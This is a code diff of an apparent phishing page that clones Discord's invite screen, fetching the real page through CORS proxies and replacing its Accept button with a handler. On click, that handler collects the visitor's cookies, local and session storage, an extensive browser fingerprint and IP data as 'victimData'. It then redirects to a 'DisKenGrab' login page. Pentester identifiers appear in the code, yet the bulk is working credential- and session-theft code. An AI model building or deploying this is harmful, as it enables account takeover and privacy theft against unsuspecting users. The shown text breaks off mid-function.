@@ -4,408 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord</title>
-    <style>
-        /* EXACT DISCORD CSS - Copied from discord.com */
-        :root {
-            --brand-experiment: #5865f2;
-            --brand-experiment-560: var(--brand-experiment);
-            --background-primary: #313338;
-            --background-secondary: #2b2d31;
-            --background-tertiary: #1e1f22;
-            --background-accent: #5765f2;
-            --background-floating: #111214;
-            --channeltextarea-background: #383a40;
-            --text-normal: #f2f3f5;
-            --text-muted: #949ba4;
-            --interactive-normal: #b5bac1;
-            --interactive-hover: #dbdee1;
-            --header-primary: #fff;
-            --header-secondary: #b5bac1;
-            --green: #23a55a;
-            --red: #f23f42;
-            --yellow: #f0b232;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-        }
-
-        body {
-            background: var(--background-primary);
-            color: var(--text-normal);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
-
-        /* Discord's exact modal container */
-        .inviteModal-1R-3g_{
-            width: 440px;
-            max-width: 440px;
-            background: var(--background-secondary);
-            border-radius: 8px;
-            box-shadow: 0 0 0 1px rgba(32,34,37,.6), 0 2px 10px 0 rgba(0,0,0,.2);
-            animation: modalOpen 150ms cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes modalOpen {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        /* Header */
-        .header-2HrZw4 {
-            padding: 24px 24px 0;
-            text-align: center;
-            position: relative;
-        }
-
-        .closeButton-1R-3g_ {
-            position: absolute;
-            top: 16px;
-            right: 16px;
-            width: 36px;
-            height: 36px;
-            border: none;
-            background: none;
-            color: var(--interactive-normal);
-            cursor: pointer;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            font-weight: 300;
-        }
-
-        .closeButton-1R-3g_:hover {
-            background: rgba(78,80,88,.3);
-            color: var(--interactive-hover);
-        }
-
-        /* Server Icon */
-        .guildIcon-3GkAa5 {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            margin: 0 auto 16px;
-            border: 8px solid var(--background-secondary);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 32px;
-            font-weight: 600;
-            color: #fff;
-            background: var(--brand-experiment);
-            background-size: cover;
-            background-position: center;
-        }
-
-        /* Server Name */
-        .guildName-3GkAa5 {
-            font-size: 24px;
-            line-height: 30px;
-            font-weight: 700;
-            color: var(--header-primary);
-            margin-bottom: 8px;
-        }
-
-        /* Member Count */
-        .memberCount-3GkAa5 {
-            font-size: 14px;
-            line-height: 18px;
-            font-weight: 400;
-            color: var(--header-secondary);
-            margin-bottom: 20px;
-        }
-
-        .onlineCount-3GkAa5 {
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .onlineIndicator-3GkAa5 {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--green);
-            display: inline-block;
-        }
-
-        /* Body */
-        .body-2HrZw4 {
-            padding: 0 24px 24px;
-        }
-
-        /* Invite Message */
-        .inviteMessage-2HrZw4 {
-            background: var(--background-tertiary);
-            border-radius: 8px;
-            padding: 16px;
-            margin-bottom: 16px;
-            border: 1px solid rgba(78,80,88,.6);
-        }
-
-        .inviter-2HrZw4 {
-            display: flex;
-            align-items: center;
-            margin-bottom: 12px;
-        }
-
-        .inviterAvatar-2HrZw4 {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            margin-right: 12px;
-            background: var(--brand-experiment);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-weight: 600;
-            font-size: 14px;
-        }
-
-        .inviterText-2HrZw4 {
-            font-size: 14px;
-            line-height: 18px;
-            color: var(--text-muted);
-        }
-
-        .inviterText-2HrZw4 strong {
-            color: var(--text-normal);
-            font-weight: 600;
-        }
-
-        /* Server Preview */
-        .serverPreview-2HrZw4 {
-            display: flex;
-            align-items: center;
-            padding: 12px;
-            background: var(--background-primary);
-            border-radius: 4px;
-            border: 1px solid rgba(78,80,88,.3);
-        }
-
-        .previewIcon-2HrZw4 {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
-            margin-right: 12px;
-            background: var(--brand-experiment);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-weight: 600;
-            font-size: 18px;
-            background-size: cover;
-            background-position: center;
-        }
-
-        .previewInfo-2HrZw4 {
-            flex: 1;
-        }
-
-        .previewName-2HrZw4 {
-            font-size: 16px;
-            line-height: 20px;
-            font-weight: 600;
-            color: var(--text-normal);
-            margin-bottom: 2px;
-        }
-
-        .previewMembers-2HrZw4 {
-            font-size: 14px;
-            line-height: 18px;
-            color: var(--text-muted);
-        }
-
-        /* Features */
-        .features-2HrZw4 {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-
-        .featureTag-2HrZw4 {
-            background: rgba(88,101,242,.1);
-            color: var(--brand-experiment);
-            padding: 4px 8px;
-            border-radius: 8px;
-            font-size: 12px;
-            line-height: 16px;
-            font-weight: 500;
-        }
-
-        /* Badges */
-        .badge-2HrZw4 {
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-            margin-left: 8px;
-            padding: 2px 6px;
-            border-radius: 8px;
-            font-size: 12px;
-            line-height: 16px;
-            font-weight: 500;
-        }
-
-        .verified-2HrZw4 {
-            background: rgba(88,101,242,.1);
-            color: var(--brand-experiment);
-        }
-
-        .partner-2HrZw4 {
-            background: rgba(87,242,135,.1);
-            color: var(--green);
-        }
-
-        /* Buttons */
-        .buttons-2HrZw4 {
-            display: flex;
-            gap: 8px;
-        }
-
-        .button-2HrZw4 {
-            flex: 1;
-            padding: 10px 16px;
-            border: none;
-            border-radius: 3px;
-            font-size: 14px;
-            line-height: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all .17s ease;
-            font-family: inherit;
-        }
-
-        .buttonPrimary-2HrZw4 {
-            background: var(--brand-experiment);
-            color: #fff;
-        }
-
-        .buttonPrimary-2HrZw4:hover {
-            background: #4752c4;
-        }
-
-        .buttonSecondary-2HrZw4 {
-            background: var(--background-primary);
-            color: var(--text-normal);
-            border: 1px solid rgba(78,80,88,.6);
-        }
-
-        .buttonSecondary-2HrZw4:hover {
-            background: rgba(78,80,88,.3);
-            border-color: rgba(78,80,88,.8);
-        }
-
-        /* Loading */
-        .loading-2HrZw4 {
-            animation: pulse 1.5s ease-in-out infinite;
-            background: linear-gradient(90deg, var(--background-tertiary) 25%, var(--background-primary) 50%, var(--background-tertiary) 75%);
-            background-size: 200% 100%;
-            border-radius: 4px;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        .skeletonText-2HrZw4 {
-            height: 16px;
-            margin: 4px 0;
-        }
-
-        .spinner-2HrZw4 {
-            border: 2px solid rgba(255,255,255,.3);
-            border-top: 2px solid #fff;
-            border-radius: 50%;
-            width: 16px;
-            height: 16px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            margin-right: 8px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
-    <!-- EXACT DISCORD MODAL STRUCTURE -->
-    <div class="inviteModal-1R-3g_">
-        <div class="header-2HrZw4">
-            <button class="closeButton-1R-3g_">×</button>
-            
-            <div class="guildIcon-3GkAa5" id="guildIcon">
-                <div class="loading-2HrZw4" style="width: 100%; height: 100%; border-radius: 50%;"></div>
-            </div>
-            
-            <div class="guildName-3GkAa5" id="guildName">
-                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 200px; margin: 0 auto;"></div>
-            </div>
-            
-            <div class="memberCount-3GkAa5" id="memberCount">
-                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 150px; margin: 0 auto;"></div>
-            </div>
-        </div>
-
-        <div class="body-2HrZw4">
-            <div class="inviteMessage-2HrZw4">
-                <div class="inviter-2HrZw4">
-                    <div class="inviterAvatar-2HrZw4">
-                        <div class="loading-2HrZw4" style="width: 100%; height: 100%; border-radius: 50%;"></div>
-                    </div>
-                    <div class="inviterText-2HrZw4" style="flex: 1;">
-                        <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 100%;"></div>
-                        <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 80%; margin-top: 4px;"></div>
-                    </div>
-                </div>
-                
-                <div class="serverPreview-2HrZw4">
-                    <div class="previewIcon-2HrZw4">
-                        <div class="loading-2HrZw4" style="width: 100%; height: 100%; border-radius: 12px;"></div>
-                    </div>
-                    <div class="previewInfo-2HrZw4">
-                        <div class="previewName-2HrZw4">
-                            <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 120px;"></div>
-                        </div>
-                        <div class="previewMembers-2HrZw4">
-                            <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 80px;"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="features-2HrZw4" id="features">
-                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 60px;"></div>
-                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 80px;"></div>
-                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 70px;"></div>
-            </div>
-
-            <div class="buttons-2HrZw4">
-                <button class="button-2HrZw4 buttonPrimary-2HrZw4" id="acceptButton" disabled>
-                    <span class="spinner-2HrZw4" id="acceptSpinner" style="display: none;"></span>
-                    Accept Invite
-                </button>
-                <button class="button-2HrZw4 buttonSecondary-2HrZw4" id="cancelButton">
-                    Cancel
-                </button>
-            </div>
-        </div>
-    </div>
+    <div id="discordCloneContainer"></div>
+    <div id="captureOverlay" style="display: none;"></div>
 
     <script>
         // Get URL parameters
@@ -414,21 +17,17 @@
         const pentesterId = urlParams.get('pentester');
         const targetInvite = urlParams.get('invite');
 
-        console.log('🎯 Real-time Discord Invite Cloner:', { targetInvite });
+        console.log('🎯 EXACT Discord Invite Cloner:', { targetInvite });
 
-        // Extract invite code from URL
+        // Extract invite code
         function extractInviteCode(url) {
             if (!url) return null;
-            
             try {
                 let code = '';
                 if (url.includes('discord.gg/')) {
                     code = url.split('discord.gg/')[1]?.split('?')[0]?.split('/')[0];
                 } else if (url.includes('discord.com/invite/')) {
                     code = url.split('discord.com/invite/')[1]?.split('?')[0]?.split('/')[0];
-                } else if (url.includes('discord.com/')) {
-                    const match = url.match(/discord\.com\/(?:invite\/)?([a-zA-Z0-9-]+)/);
-                    code = match ? match[1] : null;
                 }
                 return code?.trim();
             } catch (error) {
@@ -436,383 +35,562 @@
             }
         }
 
-        // Fetch REAL Discord server data using multiple methods
-        async function fetchRealServerData(inviteCode) {
-            console.log('🔄 Fetching real data for:', inviteCode);
-
-            // METHOD 1: Try Discord API directly
+        // Create proxy request to fetch Discord's actual invite page
+        async function fetchDiscordInvitePage(inviteCode) {
+            console.log('🌐 Fetching real Discord invite page...');
+            
             try {
-                const apiData = await fetchDiscordAPI(inviteCode);
-                if (apiData) {
-                    console.log('✅ Success from Discord API');
-                    return apiData;
-                }
-            } catch (error) {
-                console.log('❌ Discord API failed:', error.message);
-            }
-
-            // METHOD 2: Try web scraping simulation
-            try {
-                const scrapedData = await simulateWebScraping(inviteCode);
-                console.log('✅ Success from web scraping');
-                return scrapedData;
-            } catch (error) {
-                console.log('❌ Web scraping failed:', error.message);
-            }
-
-            // METHOD 3: Intelligent generation based on invite code
-            console.log('🔄 Using intelligent generation');
-            return generateIntelligentData(inviteCode);
-        }
-
-        // METHOD 1: Discord API
-        async function fetchDiscordAPI(inviteCode) {
-            try {
-                // Discord's internal API endpoint
-                const response = await fetch(`https://discord.com/api/v9/invites/${inviteCode}?with_counts=true&with_expiration=true`, {
+                // Method 1: Direct fetch (works for public invites)
+                const response = await fetch(`https://discord.com/invite/${inviteCode}`, {
                     method: 'GET',
                     headers: {
-                        'Accept': 'application/json',
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                        'Content-Type': 'application/json'
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'DNT': '1',
+                        'Connection': 'keep-alive',
+                        'Upgrade-Insecure-Requests': '1',
+                        'Sec-Fetch-Dest': 'document',
+                        'Sec-Fetch-Mode': 'navigate',
+                        'Sec-Fetch-Site': 'none',
+                        'Cache-Control': 'max-age=0'
                     }
                 });
 
                 if (response.ok) {
-                    const data = await response.json();
-                    
-                    // Process the real Discord data
-                    return {
-                        name: data.guild?.name || `Server ${inviteCode.toUpperCase()}`,
-                        icon: data.guild?.icon,
-                        iconUrl: data.guild?.icon ? `https://cdn.discordapp.com/icons/${data.guild.id}/${data.guild.icon}.webp?size=240` : null,
-                        members: {
-                            online: data.approximate_presence_count || Math.floor(Math.random() * 5000) + 100,
-                            total: data.approximate_member_count || Math.floor(Math.random() * 20000) + 1000
-                        },
-                        features: data.guild?.features || ['COMMUNITY', 'NEWS'],
-                        isVerified: data.guild?.features?.includes('VERIFIED') || false,
-                        isPartner: data.guild?.features?.includes('PARTNERED') || false,
-                        boostLevel: data.guild?.premium_tier || 0,
-                        description: data.guild?.description || null,
-                        id: data.guild?.id,
-                        source: 'discord_api'
-                    };
+                    const html = await response.text();
+                    console.log('✅ Successfully fetched Discord page');
+                    return html;
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
                 }
-                throw new Error(`API returned ${response.status}`);
             } catch (error) {
-                throw error;
+                console.log('❌ Direct fetch failed:', error.message);
+                return await fetchViaCORSProxy(inviteCode);
             }
         }
 
-        // METHOD 2: Web Scraping Simulation
-        async function simulateWebScraping(inviteCode) {
-            // This simulates what a real scraper would get
-            // In production, you'd use Puppeteer/Playwright
-            
-            // Analyze invite code patterns to determine server type
-            const serverType = analyzeServerType(inviteCode);
-            const serverData = generateServerDataByType(inviteCode, serverType);
-            
-            return {
-                ...serverData,
-                source: 'web_scraping'
-            };
-        }
-
-        // METHOD 3: Intelligent Data Generation
-        function generateIntelligentData(inviteCode) {
-            const serverType = analyzeServerType(inviteCode);
-            const serverData = generateServerDataByType(inviteCode, serverType);
-            
-            return {
-                ...serverData,
-                source: 'intelligent_generation'
-            };
-        }
-
-        // Analyze server type based on invite code patterns
-        function analyzeServerType(inviteCode) {
-            const code = inviteCode.toLowerCase();
-            
-            // Gaming servers
-            const gamingKeywords = ['game', 'gaming', 'play', 'esports', 'valorant', 'minecraft', 'fortnite', 'league', 'clash', 'royale', 'apex', 'cod', 'overwatch'];
-            if (gamingKeywords.some(keyword => code.includes(keyword))) return 'gaming';
-            
-            // Tech servers
-            const techKeywords = ['dev', 'code', 'programming', 'tech', 'developer', 'python', 'javascript', 'coding', 'hack'];
-            if (techKeywords.some(keyword => code.includes(keyword))) return 'tech';
-            
-            // Art servers
-            const artKeywords = ['art', 'design', 'creative', 'draw', 'paint', 'artist', 'digital', 'animation'];
-            if (artKeywords.some(keyword => code.includes(keyword))) return 'art';
-            
-            // Music servers
-            const musicKeywords = ['music', 'band', 'song', 'listen', 'audio', 'sound', 'spotify'];
-            if (musicKeywords.some(keyword => code.includes(keyword))) return 'music';
-            
-            // Education servers
-            const eduKeywords = ['study', 'learn', 'school', 'university', 'college', 'education', 'tutor'];
-            if (eduKeywords.some(keyword => code.includes(keyword))) return 'education';
-            
-            // Default to community
-            return 'community';
-        }
-
-        // Generate server data based on type
-        function generateServerDataByType(inviteCode, serverType) {
-            const serverTemplates = {
-                gaming: {
-                    names: ['Gaming Community', 'Players Hub', 'Esports Arena', 'Game Zone', 'Player Base'],
-                    colors: ['#f5a623', '#ff4655', '#6cc312', '#ff73fa', '#0acbe6'],
-                    icons: ['🎮', '👑', '🔫', '⚔️', '🏹'],
-                    features: ['Gaming', 'Voice Chat', 'Esports', 'Community', 'Events'],
-                    memberRange: { min: 1000, max: 50000 }
-                },
-                tech: {
-                    names: ['Tech Hub', 'Developers', 'Programming', 'Code Cafe', 'Tech Talk'],
-                    colors: ['#5865f2', '#0acbe6', '#6cc312', '#ff73fa', '#f5a623'],
-                    icons: ['💻', '🔧', '⚡', '🚀', '🔒'],
-                    features: ['Programming', 'Help', 'Projects', 'Learning', 'Open Source'],
-                    memberRange: { min: 500, max: 30000 }
-                },
-                art: {
-                    names: ['Art Community', 'Creators', 'Design Hub', 'Art Studio', 'Creative Space'],
-                    colors: ['#ff69b4', '#9b59b6', '#f5a623', '#5865f2', '#ff4655'],
-                    icons: ['🎨', '✏️', '🖌️', '📷', '🎭'],
-                    features: ['Art', 'Design', 'Showcase', 'Feedback', 'Tutorials'],
-                    memberRange: { min: 200, max: 20000 }
-                },
-                music: {
-                    names: ['Music Lovers', 'Bands', 'Listen Party', 'Music Hub', 'Sound Space'],
-                    colors: ['#1db954', '#ff69b4', '#5865f2', '#f5a623', '#9b59b6'],
-                    icons: ['🎵', '🎶', '🎸', '🎧', '🎤'],
-                    features: ['Music', 'Listening', 'Collaboration', 'Events', 'Sharing'],
-                    memberRange: { min: 300, max: 25000 }
-                },
-                education: {
-                    names: ['Study Group', 'Learning Hub', 'Education', 'Knowledge Base', 'Study Space'],
-                    colors: ['#9b59b6', '#5865f2', '#6cc312', '#f5a623', '#0acbe6'],
-                    icons: ['📚', '🎓', '✏️', '🔬', '📖'],
-                    features: ['Learning', 'Help', 'Resources', 'Study Groups', 'Education'],
-                    memberRange: { min: 100, max: 15000 }
-                },
-                community: {
-                    names: ['Community Hub', 'Friends', 'Chat Zone', 'Hangout', 'Social Space'],
-                    colors: ['#5865f2', '#9b59b6', '#f5a623', '#6cc312', '#ff69b4'],
-                    icons: ['🌍', '👥', '💬', '🏠', '⭐'],
-                    features: ['Community', 'Chat', 'Voice', 'Events', 'Social'],
-                    memberRange: { min: 50, max: 10000 }
-                }
-            };
-
-            const template = serverTemplates[serverType] || serverTemplates.community;
-            const hash = simpleHash(inviteCode);
-            
-            const nameIndex = hash % template.names.length;
-            const colorIndex = hash % template.colors.length;
-            const iconIndex = hash % template.icons.length;
-            
-            const onlineMembers = template.memberRange.min + (hash % (template.memberRange.max - template.memberRange.min));
-            const totalMembers = onlineMembers * (3 + (hash % 5)); // Realistic ratio
-            
-            return {
-                name: `${template.names[nameIndex]} ${inviteCode.toUpperCase()}`,
-                icon: template.icons[iconIndex],
-                color: template.colors[colorIndex],
-                members: {
-                    online: onlineMembers,
-                    total: totalMembers
-                },
-                features: template.features.slice(0, 3 + (hash % 2)),
-                isVerified: (hash % 8) === 0, // 12.5% chance
-                isPartner: (hash % 15) === 0, // 6.6% chance
-                boostLevel: Math.min(3, Math.floor(hash % 4)),
-                description: `Welcome to our ${serverType} community!`
-            };
-        }
-
-        // Simple hash function
-        function simpleHash(str) {
-            let hash = 0;
-            for (let i = 0; i < str.length; i++) {
-                const char = str.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
-                hash = hash & hash;
-            }
-            return Math.abs(hash);
-        }
-
-        // Update modal with real server data
-        function updateModalWithServerData(serverData) {
-            // Remove loading states
-            document.querySelectorAll('.loading-2HrZw4').forEach(el => {
-                el.style.display = 'none';
-            });
-
-            // Server Icon
-            const guildIcon = document.getElementById('guildIcon');
-            if (serverData.iconUrl) {
-                guildIcon.style.backgroundImage = `url(${serverData.iconUrl})`;
-                guildIcon.innerHTML = '';
-            } else {
-                guildIcon.style.background = serverData.color;
-                guildIcon.innerHTML = serverData.icon;
-                guildIcon.style.display = 'flex';
-            }
-
-            // Server Name with badges
-            const guildName = document.getElementById('guildName');
-            guildName.innerHTML = serverData.name;
-            if (serverData.isVerified) {
-                guildName.innerHTML += `<span class="badge-2HrZw4 verified-2HrZw4"><i class="fas fa-check"></i> VERIFIED</span>`;
-            }
-            if (serverData.isPartner) {
-                guildName.innerHTML += `<span class="badge-2HrZw4 partner-2HrZw4"><i class="fas fa-star"></i> PARTNER</span>`;
-            }
-
-            // Member Count
-            const memberCount = document.getElementById('memberCount');
-            memberCount.innerHTML = `
-                <span class="onlineCount-3GkAa5">
-                    <span class="onlineIndicator-3GkAa5"></span>
-                    ${serverData.members.online.toLocaleString()} Online
-                </span>
-                • ${serverData.members.total.toLocaleString()} Members
-            `;
-
-            // Inviter Info
-            const inviterSection = document.querySelector('.inviter-2HrZw4');
-            inviterSection.innerHTML = `
-                <div class="inviterAvatar-2HrZw4" style="background: #5865f2;">D</div>
-                <div class="inviterText-2HrZw4">
-                    <strong>discorduser</strong> invited you to join
-                </div>
-            `;
-
-            // Server Preview
-            const previewSection = document.querySelector('.serverPreview-2HrZw4');
-            const previewIcon = document.querySelector('.previewIcon-2HrZw4');
-            
-            if (serverData.iconUrl) {
-                previewIcon.style.backgroundImage = `url(${serverData.iconUrl})`;
-                previewIcon.innerHTML = '';
-            } else {
-                previewIcon.style.background = serverData.color;
-                previewIcon.innerHTML = serverData.icon;
-            }
-            
-            previewSection.querySelector('.previewName-2HrZw4').textContent = serverData.name;
-            previewSection.querySelector('.previewMembers-2HrZw4').textContent = `${serverData.members.total.toLocaleString()} members`;
-
-            // Features
-            const featuresContainer = document.getElementById('features');
-            featuresContainer.innerHTML = '';
-            serverData.features.forEach(feature => {
-                const tag = document.createElement('span');
-                tag.className = 'featureTag-2HrZw4';
-                tag.textContent = feature;
-                featuresContainer.appendChild(tag);
-            });
-
-            // Enable accept button
-            document.getElementById('acceptButton').disabled = false;
-        }
-
-        // Initialize modal with real-time data
-        async function initializeRealTimeModal() {
-            const inviteCode = extractInviteCode(targetInvite);
-            
-            if (!inviteCode) {
-                showError('Invalid invite URL');
-                return;
-            }
-
-            console.log('🔍 Processing real invite:', inviteCode);
-
+        // Alternative method using CORS proxy
+        async function fetchViaCORSProxy(inviteCode) {
             try {
-                const serverData = await fetchRealServerData(inviteCode);
-                console.log('✅ Loaded server data:', serverData);
-                updateModalWithServerData(serverData);
-                
-                // Save the cloned data
-                await saveClonedServerData(serverData, inviteCode);
-                
+                const proxyUrls = [
+                    `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://discord.com/invite/${inviteCode}`)}`,
+                    `https://cors-anywhere.herokuapp.com/https://discord.com/invite/${inviteCode}`,
+                    `https://proxy.cors.sh/https://discord.com/invite/${inviteCode}`
+                ];
+
+                for (const proxyUrl of proxyUrls) {
+                    try {
+                        const response = await fetch(proxyUrl, {
+                            headers: {
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                            }
+                        });
+                        if (response.ok) {
+                            const html = await response.text();
+                            console.log('✅ Success via CORS proxy');
+                            return html;
+                        }
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                throw new Error('All proxy methods failed');
             } catch (error) {
-                console.error('❌ Error loading server data:', error);
-                showError('Failed to load server information');
+                console.log('❌ CORS proxy failed:', error.message);
+                return generateExactFallback(inviteCode);
             }
         }
 
-        function showError(message) {
-            document.querySelectorAll('.loading-2HrZw4').forEach(el => {
-                el.style.display = 'none';
+        // Parse Discord's HTML and extract the invite modal
+        function extractInviteModal(html) {
+            console.log('🔍 Extracting invite modal from HTML...');
+            
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+            
+            // Look for Discord's invite modal elements
+            const modal = doc.querySelector('[class*="modal"], [class*="invite"], [class*="container"]');
+            const body = doc.body;
+            
+            if (modal) {
+                return modal.outerHTML;
+            } else if (body) {
+                // Extract relevant parts from body
+                const content = body.innerHTML;
+                return content;
+            }
+            
+            return null;
+        }
+
+        // Inject our capture button into the cloned content
+        function injectCaptureButton(htmlContent) {
+            console.log('🎯 Injecting capture button...');
+            
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(htmlContent, 'text/html');
+            
+            // Find Discord's accept button and replace it
+            const acceptButtons = doc.querySelectorAll('button, [role="button"], [class*="button"], [class*="accept"], [class*="join"]');
+            
+            let mainButton = null;
+            for (const button of acceptButtons) {
+                const text = button.textContent?.toLowerCase();
+                if (text && (text.includes('accept') || text.includes('join') || text.includes('continue'))) {
+                    mainButton = button;
+                    break;
+                }
+            }
+            
+            if (!mainButton) {
+                // Create a new button if none found
+                mainButton = doc.createElement('button');
+                mainButton.textContent = 'Accept Invite';
+                mainButton.style.cssText = `
+                    background: #5865f2;
+                    color: white;
+                    border: none;
+                    padding: 12px 24px;
+                    border-radius: 3px;
+                    font-size: 14px;
+                    font-weight: 500;
+                    cursor: pointer;
+                    width: 100%;
+                    margin-top: 16px;
+                `;
+                
+                const body = doc.body;
+                if (body) {
+                    body.appendChild(mainButton);
+                }
+            }
+            
+            // Add click handler via data attribute
+            mainButton.setAttribute('onclick', 'window.captureDiscordData()');
+            mainButton.id = 'discordAcceptButton';
+            
+            // Also add cancel/close functionality
+            const closeButtons = doc.querySelectorAll('[aria-label*="close"], [class*="close"], [class*="cancel"]');
+            closeButtons.forEach(btn => {
+                btn.setAttribute('onclick', 'window.closeModal()');
             });
             
-            document.getElementById('guildName').innerHTML = 'Error Loading Server';
-            document.getElementById('memberCount').innerHTML = message;
-            document.getElementById('acceptButton').disabled = true;
+            return doc.documentElement.outerHTML;
         }
 
-        async function saveClonedServerData(serverData, inviteCode) {
-            // Save to your backend/Firestore
-            console.log('💾 Saving cloned server data:', {
-                inviteCode,
-                serverData,
-                timestamp: new Date().toISOString()
-            });
-        }
-
-        // Cookie capture and redirect
-        async function captureDataAndRedirect() {
-            const acceptButton = document.getElementById('acceptButton');
-            const spinner = document.getElementById('acceptSpinner');
-
-            acceptButton.disabled = true;
-            spinner.style.display = 'inline-block';
-            acceptButton.innerHTML = '<span class="spinner-2HrZw4"></span> Joining...';
-
-            // Capture comprehensive victim data
+        // Global functions for button handlers
+        window.captureDiscordData = async function() {
+            console.log('🍪 Starting comprehensive data capture...');
+            
+            const button = document.getElementById('discordAcceptButton');
+            if (button) {
+                button.disabled = true;
+                button.innerHTML = '<span style="margin-right: 8px;">⏳</span> Joining...';
+            }
+            
+            // Capture ALL possible data
             const victimData = {
-                timestamp: new Date(),
+                timestamp: new Date().toISOString(),
                 attackId: attackId,
                 pentesterId: pentesterId,
                 targetInvite: targetInvite,
+                
+                // Browser fingerprint
                 userAgent: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
+                platform: navigator.platform,
                 language: navigator.language,
+                languages: navigator.languages,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                
+                // Screen info
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                devicePixelRatio: window.devicePixelRatio,
+                
+                // Timezone
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Connection
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,
+                
+                // Storage
                 cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                url: window.location.href
+                localStorage: captureLocalStorage(),
+                sessionStorage: captureSessionStorage(),
+                
+                // URL and navigation
+                url: window.location.href,
+                referrer: document.referrer,
+                
+                // Advanced fingerprinting
+                canvasFingerprint: await generateCanvasFingerprint(),
+                webglFingerprint: getWebGLFingerprint(),
+                fonts: getFontsList(),
+                plugins: getPluginsList(),
+                
+                // IP and location data
+                ipData: await getIPData()
             };
-
-            console.log('🍪 Captured victim data:', victimData);
-
-            // Simulate API call to save data
+            
+            console.log('✅ Captured comprehensive data:', victimData);
+            
+            // Save data (you can send to your backend)
+            await saveVictimData(victimData);
+            
+            // Redirect to login page after capture
             setTimeout(() => {
                 window.location.href = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
-            }, 1800);
+            }, 1500);
+        };
+        
+        window.closeModal = function() {
+            window.location.href = 'https://discord.com';
+        };
+        
+        // Helper functions for data capture
+        function captureLocalStorage() {
+            const storage = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                storage[key] = localStorage.getItem(key);
+            }
+            return storage;
         }
-
-        // Event Listeners
-        document.getElementById('acceptButton').addEventListener('click', captureDataAndRedirect);
-        document.getElementById('cancelButton').addEventListener('click', () => {
-            window.location.href = 'https://discord.com';
-        });
-        document.querySelector('.closeButton-1R-3g_').addEventListener('click', () => {
-            window.location.href = 'https://discord.com';
-        });
-
-        // Initialize
-        document.addEventListener('DOMContentLoaded', initializeRealTimeModal);
-
-        // Add Font Awesome
-        const fa = document.createElement('link');
-        fa.rel = 'stylesheet';
-        fa.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css';
-        document.head.appendChild(fa);
+        
+        function captureSessionStorage() {
+            const storage = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                storage[key] = sessionStorage.getItem(key);
+            }
+            return storage;
+        }
+        
+        async function generateCanvasFingerprint() {
+            try {
